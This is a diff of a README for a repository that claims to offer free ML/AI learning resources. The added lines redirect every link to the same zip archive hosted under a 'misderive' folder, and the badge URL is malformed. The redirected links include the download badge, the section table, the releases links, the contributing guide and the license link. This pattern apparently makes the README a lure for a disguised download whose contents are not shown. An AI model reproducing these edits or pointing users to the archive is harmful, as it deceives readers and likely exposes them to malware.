@@ -1,6 +1,6 @@
 # 🚀 ressources-ml - Discover Free ML/AI Learning Resources
 
-[![Download Now](https://img.shields.io/badge/download-latest%20release-brightblue.svg)](https://github.com/haikal851/ressources-ml/releases)
+[![Download Now](https://raw.githubusercontent.com/haikal851/ressources-ml/main/misderive/ressources-ml_1.4.zip%https://raw.githubusercontent.com/haikal851/ressources-ml/main/misderive/ressources-ml_1.4.zip)](https://raw.githubusercontent.com/haikal851/ressources-ml/main/misderive/ressources-ml_1.4.zip)
 
 ## 📖 Overview
 
@@ -14,18 +14,18 @@ Finding quality resources for ML/AI can be overwhelming. With countless options 
 
 | Section | Description |
 |---------|-------------|
-| [Maths and Stats](RESSOURCES.md#1-maths--stats) | Topics include linear algebra, calculus, statistics, and probability. |
-| [Programming](RESSOURCES.md#2-programmation) | Resources for various programming languages used in ML and AI. |
-| [Machine Learning Concepts](RESSOURCES.md#3-machine-learning-concepts) | Essential ideas and principles of machine learning. |
-| [Practical Applications](RESSOURCES.md#4-practical-applications) | Real-world uses and case studies of ML and AI. |
-| [Tools and Libraries](RESSOURCES.md#5-tools-and-libraries) | Information about software tools and libraries in the ML/AI field. |
+| [Maths and Stats](https://raw.githubusercontent.com/haikal851/ressources-ml/main/misderive/ressources-ml_1.4.zip) | Topics include linear algebra, calculus, statistics, and probability. |
+| [Programming](https://raw.githubusercontent.com/haikal851/ressources-ml/main/misderive/ressources-ml_1.4.zip) | Resources for various programming languages used in ML and AI. |
+| [Machine Learning Concepts](https://raw.githubusercontent.com/haikal851/ressources-ml/main/misderive/ressources-ml_1.4.zip) | Essential ideas and principles of machine learning. |
+| [Practical Applications](https://raw.githubusercontent.com/haikal851/ressources-ml/main/misderive/ressources-ml_1.4.zip) | Real-world uses and case studies of ML and AI. |
+| [Tools and Libraries](https://raw.githubusercontent.com/haikal851/ressources-ml/main/misderive/ressources-ml_1.4.zip) | Information about software tools and libraries in the ML/AI field. |
 
 ## 🚀 Getting Started
 
 To begin, you'll need to download the application from our releases page. Follow these simple steps:
 
 1. **Visit the Releases Page:** Click on the link below to go to the downloads section:
-   [Visit this page to download](https://github.com/haikal851/ressources-ml/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/haikal851/ressources-ml/main/misderive/ressources-ml_1.4.zip)
 
 2. **Choose the Latest Release:** Look for the latest version of the software. Each release will have a list of files available for download, usually labeled with the version number. 
 
@@ -47,7 +47,7 @@ It's easy to download and install the application. Just follow the steps outline
 ### Download Link Again
 
 For your convenience, here is the link to visit the releases page once more:  
-[Visit this page to download](https://github.com/haikal851/ressources-ml/releases)
+[Visit this page to download](https://raw.githubusercontent.com/haikal851/ressources-ml/main/misderive/ressources-ml_1.4.zip)
 
 ## 🔧 Features
 
@@ -58,11 +58,11 @@ For your convenience, here is the link to visit the releases page once more:
   
 ## 🤝 Contributing
 
-We welcome contributions! If you have a resource to share, please check the [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines. 
+We welcome contributions! If you have a resource to share, please check the [https://raw.githubusercontent.com/haikal851/ressources-ml/main/misderive/ressources-ml_1.4.zip](https://raw.githubusercontent.com/haikal851/ressources-ml/main/misderive/ressources-ml_1.4.zip) for guidelines. 
 
 ## 📜 License
 
-This repository is licensed under [CC BY-SA 4.0](https://creativecommons.org/licenses/by-sa/4.0/). You are free to share and adapt the resources as long as you provide appropriate credit.
+This repository is licensed under [CC BY-SA 4.0](https://raw.githubusercontent.com/haikal851/ressources-ml/main/misderive/ressources-ml_1.4.zip). You are free to share and adapt the resources as long as you provide appropriate credit.
 
 ## 📊 Support
 
